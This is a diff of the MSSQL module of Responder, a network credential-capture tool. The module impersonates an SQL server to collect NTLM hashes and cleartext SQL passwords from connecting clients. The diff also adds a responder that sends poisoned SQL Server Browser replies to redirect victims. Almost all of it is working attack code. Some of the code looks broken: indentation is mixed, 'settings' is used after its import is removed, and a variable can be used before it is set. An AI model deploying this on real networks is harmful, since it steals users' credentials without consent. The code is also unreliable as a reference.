@@ -1,7 +1,7 @@
 #!/usr/bin/env python
-# This file is part of Responder
-# Original work by Laurent Gaffie - Trustwave Holdings
-#
+# This file is part of Responder, a network take-over set of tools 
+# created and maintained by Laurent Gaffie.
+# email: laurent.gaffie@gmail.com
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation, either version 3 of the License, or
@@ -14,13 +14,11 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import os
-import struct
-import settings
-
 from SocketServer import BaseRequestHandler
 from packets import MSSQLPreLoginAnswer, MSSQLNTLMChallengeAnswer
 from utils import *
+import random
+import struct
 
 class TDS_Login_Packet:
 	def __init__(self, data):
@@ -54,7 +52,8 @@ class TDS_Login_Packet:
 		self.Locale       = data[8+LocaleOff:8+LocaleOff+LocaleLen*2].replace('\x00', '')
 		self.DatabaseName = data[8+DatabaseNameOff:8+DatabaseNameOff+DatabaseNameLen*2].replace('\x00', '')
 
-def ParseSQLHash(data, client):
+
+def ParseSQLHash(data, client, Challenge):
 	SSPIStart     = data[8:]
 
 	LMhashLen     = struct.unpack('<H',data[20:22])[0]
@@ -74,7 +73,7 @@ def ParseSQLHash(data, client):
 	User          = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
 
 	if NthashLen == 24:
-		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, settings.Config.NumChal)
+		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, Challenge.encode('hex'))
 
 		SaveToDb({
 			'module': 'MSSQL', 
@@ -86,7 +85,7 @@ def ParseSQLHash(data, client):
 		})
 
 	if NthashLen > 60:
-		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
+		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, Challenge.encode('hex'), NTHash[:32], NTHash[32:])
 		
 		SaveToDb({
 			'module': 'MSSQL', 
@@ -97,17 +96,17 @@ def ParseSQLHash(data, client):
 			'fullhash': WriteHash,
 		})
 
+
 def ParseSqlClearTxtPwd(Pwd):
 	Pwd = map(ord,Pwd.replace('\xa5',''))
-	Pw = []
+	Pw = ''
 	for x in Pwd:
-		Pw.append(hex(x ^ 0xa5)[::-1][:2].replace("x","0").decode('hex'))
-	return ''.join(Pw)
+		Pw += hex(x ^ 0xa5)[::-1][:2].replace("x", "0").decode('hex')
+	return Pw
+
 
 def ParseClearTextSQLPass(data, client):
-
 	TDS = TDS_Login_Packet(data)
-
 	SaveToDb({
 		'module': 'MSSQL', 
 		'type': 'Cleartext', 
@@ -120,38 +119,60 @@ def ParseClearTextSQLPass(data, client):
 
 # MSSQL Server class
 class MSSQL(BaseRequestHandler):
-
 	def handle(self):
-		if settings.Config.Verbose:
-			print text("[MSSQL] Received connection from %s" % self.client_address[0])
 	
 		try:
-			while True:
-				data = self.request.recv(1024)
-				self.request.settimeout(0.1)
+			data = self.request.recv(1024)
+			if settings.Config.Verbose:
+				print text("[MSSQL] Received connection from %s" % self.client_address[0])
 
-				# Pre-Login Message
-				if data[0] == "\x12":
-					Buffer = str(MSSQLPreLoginAnswer())
+			if data[0] == "\x12":  # Pre-Login Message
+				Buffer = str(MSSQLPreLoginAnswer())
+				self.request.send(Buffer)
+				data = self.request.recv(1024)
+
+			if data[0] == "\x10":  # NegoSSP
+				if re.search("NTLMSSP",data):
+                                        Challenge = RandomChallenge()
+					Packet = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
+					Packet.calculate()
+					Buffer = str(Packet)
 					self.request.send(Buffer)
 					data = self.request.recv(1024)
+				else:
+					ParseClearTextSQLPass(data,self.client_address[0])
 
-				# NegoSSP
-				if data[0] == "\x10":
-					if re.search("NTLMSSP",data):
-						Packet = MSSQLNTLMChallengeAnswer(ServerChallenge=settings.Config.Challenge)
-						Packet.calculate()
-						Buffer = str(Packet)
-						self.request.send(Buffer)
-						data = self.request.recv(1024)
+			if data[0] == "\x11":  # NegoSSP Auth
+				ParseSQLHash(data,self.client_address[0],Challenge)
 
-					else:
-						ParseClearTextSQLPass(data,self.client_address[0])
-				
-				# NegoSSP Auth
-				if data[0] == "\x11":
-					ParseSQLHash(data,self.client_address[0])
+		except:
+                        pass
 
-		except socket.timeout:
-			pass
-			self.request.close()
+# MSSQL Server Browser class
+# See "[MC-SQLR]: SQL Server Resolution Protocol": https://msdn.microsoft.com/en-us/library/cc219703.aspx
+class MSSQLBrowser(BaseRequestHandler):
+	def handle(self):
+		if settings.Config.Verbose:
+			print text("[MSSQL-BROWSER] Received request from %s" % self.client_address[0])
+
+		data, soc = self.request
+
+		if data:
+			if data[0] in "\x02\x03": # CLNT_BCAST_EX / CLNT_UCAST_EX
+				self.send_response(soc, "MSSQLSERVER")
+			elif data[0] == "\x04": # CLNT_UCAST_INST
+				self.send_response(soc, data[1:].rstrip("\x00"))
+			elif data[0] == "\x0F": # CLNT_UCAST_DAC
+				self.send_dac_response(soc)
+
+	def send_response(self, soc, inst):
+		print text("[MSSQL-BROWSER] Sending poisoned response to %s" % self.client_address[0])
+
+		server_name = ''.join(chr(random.randint(ord('A'), ord('Z'))) for _ in range(random.randint(12, 20)))
+		resp = "ServerName;%s;InstanceName;%s;IsClustered;No;Version;12.00.4100.00;tcp;1433;;" % (server_name, inst)
+		soc.sendto(struct.pack("<BH", 0x05, len(resp)) + resp, self.client_address)
+
+	def send_dac_response(self, soc):
+		print text("[MSSQL-BROWSER] Sending poisoned DAC response to %s" % self.client_address[0])
+
+		soc.sendto(struct.pack("<BHBH", 0x05, 0x06, 0x01, 1433), self.client_address)
